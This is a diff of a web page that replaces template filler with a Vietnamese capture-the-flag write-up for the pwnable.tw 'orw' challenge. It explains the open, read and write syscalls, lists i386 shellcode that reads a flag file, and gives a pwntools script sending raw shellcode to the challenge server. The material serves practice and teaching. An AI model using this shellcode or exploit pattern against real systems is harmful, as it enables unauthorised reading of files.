@@ -163,75 +163,77 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="orw---basic-shell-code"><a class="header" href="#orw---basic-shell-code">orw - basic shell code</a></h1>
-<p>Here is some text. Here is some more text. wow!</p>
-<p>Here is a list of items:</p>
+                        <h1 id="orw"><a class="header" href="#orw">orw</a></h1>
+<h3 id="hint"><a class="header" href="#hint">Hint</a></h3>
+<blockquote>
+<p>Read the flag from /home/orw/flag.</p>
+<p>Only open read write syscall are allowed to use.</p>
+</blockquote>
+<p>Oke giờ là việc viết shell code: <a href="https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm">more</a></p>
+<h3 id="sys_open"><a class="header" href="#sys_open">sys_open():</a></h3>
 <ul>
-<li>Item A</li>
-<li>Item B</li>
+<li>eax = 0x5</li>
+<li>ebx: filename. Ta sẽ push tên file vào stack và gán ebx = esp</li>
+<li>ecx: access mode: read-only (0), write-only (1), read-write (2). Ta chỉ cần đọc file nên ecx = 0 là đủ</li>
+<li>edx: file permission. Ta không cần quan tâm, cho edx = 0</li>
+<li>sys_open() sẽ trả về file desciptor, lưu vào thanh ghi eax.</li>
 </ul>
-<p>Here is some code sample:</p>
-<pre><code class="language-js">console.log('Hello, World!');
+<h3 id="sys_read"><a class="header" href="#sys_read">sys_read():</a></h3>
+<ul>
+<li>eax = 0x3</li>
+<li>ebx: file descriptor của file cần mở. Chính là giá trị trả về từ hàm sys_open() bên trên đã được lưu vào thanh ghi eax. Nên ebx = eax</li>
+<li>ecx: con trỏ trỏ đến thanh ghi chứa chuỗi đọc được. Ta chọn bừa 1 thanh ghi nào đó: ecx = esi</li>
+<li>edx: số byte đọc từ file. Cứ việc cho edx lớn: edx = 0x100</li>
+<li>sys_read() sẽ trả về số kí tự thật sự được đọc, lưu vào thanh ghi eax</li>
+</ul>
+<h3 id="sys_write"><a class="header" href="#sys_write">sys_write():</a></h3>
+<ul>
+<li>eax = 0x4</li>
+<li>ebx: file descriptor. Ta cần ghi ra màn hình nên ebx = 0x1 (fd của stdout)</li>
+<li>ecx: con trỏ trỏ đến thanh ghi chứa chuỗi cần ghi. Lúc nãy ta đã lưu vào thanh ghi esi vậy nên ecx = esi</li>
+<li>edx: số byte cần ghi. Chính là giá trị trả về của sys_read(). edx = eax</li>
+<li>sys_write() sẽ trả về số kí tự thật sự được ghi.</li>
+</ul>
+<pre><code class="language-python">&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; binascii.hexlify(b'/home/orw/flag/\x00\x00'[::-1])
+b'00002f67616c662f77726f2f656d6f682f'
 </code></pre>
-<pre><code class="language-console">    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
+<h3 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h3>
+<pre><code class="language-python">push 0x00006761
+push 0x6c662f77
+push 0x726f2f65
+push 0x6d6f682f
+
+mov ebx,esp
+xor ecx,ecx
+xor edx,edx
+mov eax,0x05
+int 0x80
+
+mov ebx,eax
+mov ecx,esi
+mov edx,0x100
+mov eax,0x03
+int 0x80
+
+mov ebx,0x1
+mov ecx,esi
+mov edx,eax
+mov eax,0x04
+int 0x80
+
 </code></pre>
-<pre><code class="language-java">pwndbg&gt; disass main
-Dump of assembler code for function main:
-   0x080488d9 &lt;+0&gt;:	lea    ecx,[esp+0x4]
-   0x080488dd &lt;+4&gt;:	and    esp,0xfffffff0
-   0x080488e0 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
-   0x080488e3 &lt;+10&gt;:	push   ebp
-   0x080488e4 &lt;+11&gt;:	mov    ebp,esp
-   0x080488e6 &lt;+13&gt;:	push   ebx
-   0x080488e7 &lt;+14&gt;:	push   ecx
-   0x080488e8 &lt;+15&gt;:	sub    esp,0xa0
-   0x080488ee &lt;+21&gt;:	call   0x8048780 &lt;__x86.get_pc_thunk.bx&gt;
-   0x080488f3 &lt;+26&gt;:	add    ebx,0x9170d
-   0x080488f9 &lt;+32&gt;:	mov    eax,0x80da498
-   0x080488ff &lt;+38&gt;:	mov    eax,DWORD PTR [eax]
-   0x08048901 &lt;+40&gt;:	push   0x0
-   0x08048903 &lt;+42&gt;:	push   0x2
-   0x08048905 &lt;+44&gt;:	push   0x0
-   0x08048907 &lt;+46&gt;:	push   eax
-   0x08048908 &lt;+47&gt;:	call   0x8050490 &lt;setvbuf&gt;
-   0x0804890d &lt;+52&gt;:	add    esp,0x10
-   0x08048910 &lt;+55&gt;:	call   0x806c600 &lt;getegid&gt;
-   0x08048915 &lt;+60&gt;:	mov    DWORD PTR [ebp-0xc],eax
-   0x08048918 &lt;+63&gt;:	sub    esp,0x4
+<h3 id="exploit"><a class="header" href="#exploit">Exploit</a></h3>
+<pre><code class="language-python">from pwn import *
+r = remote(&quot;chall.pwnable.tw&quot;,10001)
+
+shellcode = b&quot;\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x31\xC9\x31\xC0\x89\xE3\xB8\x05\x00\x00\x00\xCD\x80\xB8\x03\x00\x00\x00\x89\xC3\x89\xE1\xBA\x40\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xCD\x80&quot;
+
+r.sendline(shellcode)
+print(r.recvuntil(b&quot;shellcode:&quot;))
+r.interactive()
+
 </code></pre>
-<pre><code class="language-python">pwndbg&gt; disass main
-Dump of assembler code for function main:
-   0x080488d9 &lt;+0&gt;:	lea    ecx,[esp+0x4]
-   0x080488dd &lt;+4&gt;:	and    esp,0xfffffff0
-   0x080488e0 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
-   0x080488e3 &lt;+10&gt;:	push   ebp
-   0x080488e4 &lt;+11&gt;:	mov    ebp,esp
-   0x080488e6 &lt;+13&gt;:	push   ebx
-   0x080488e7 &lt;+14&gt;:	push   ecx
-   0x080488e8 &lt;+15&gt;:	sub    esp,0xa0
-   0x080488ee &lt;+21&gt;:	call   0x8048780 &lt;__x86.get_pc_thunk.bx&gt;
-   0x080488f3 &lt;+26&gt;:	add    ebx,0x9170d
-   0x080488f9 &lt;+32&gt;:	mov    eax,0x80da498
-   0x080488ff &lt;+38&gt;:	mov    eax,DWORD PTR [eax]
-   0x08048901 &lt;+40&gt;:	push   0x0
-   0x08048903 &lt;+42&gt;:	push   0x2
-   0x08048905 &lt;+44&gt;:	push   0x0
-   0x08048907 &lt;+46&gt;:	push   eax
-   0x08048908 &lt;+47&gt;:	call   0x8050490 &lt;setvbuf&gt;
-   0x0804890d &lt;+52&gt;:	add    esp,0x10
-   0x08048910 &lt;+55&gt;:	call   0x806c600 &lt;getegid&gt;
-   0x08048915 &lt;+60&gt;:	mov    DWORD PTR [ebp-0xc],eax
-   0x08048918 &lt;+63&gt;:	sub    esp,0x4
-</code></pre>
-<p>Here is an emebeded youtube video:</p>
-<div class="youtubeVideoWrapper">
-  <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ" frameborder="0" allow="accelerometer; + autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-</div>
 
                     </main>
 
